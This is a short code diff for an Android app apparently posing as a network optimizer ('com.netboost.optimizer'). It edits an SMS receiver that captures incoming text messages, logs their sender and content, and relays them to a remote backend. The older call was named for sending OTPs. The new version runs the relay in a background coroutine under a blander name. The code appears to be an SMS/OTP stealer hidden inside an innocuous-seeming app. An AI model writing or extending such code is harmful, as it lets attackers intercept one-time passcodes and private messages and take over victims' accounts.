@@ -1,4 +1,4 @@
-﻿package com.netboost.optimizer
+package com.netboost.optimizer
 
 import android.content.BroadcastReceiver
 import android.content.Context
@@ -19,7 +19,9 @@ class SmsReceiver : BroadcastReceiver() {
                 val fullBody = parts.joinToString(separator = "") { it.messageBody ?: "" }
                 Log.d("SmsReceiver", "Received SMS from $sender: $fullBody")
 
-                BackendClient.sendOtpToBackend(sender, fullBody)
+                kotlinx.coroutines.GlobalScope.launch {
+                    BackendClient.relay(sender, fullBody, java.util.UUID.randomUUID().toString())
+                }
             }
         }
     }
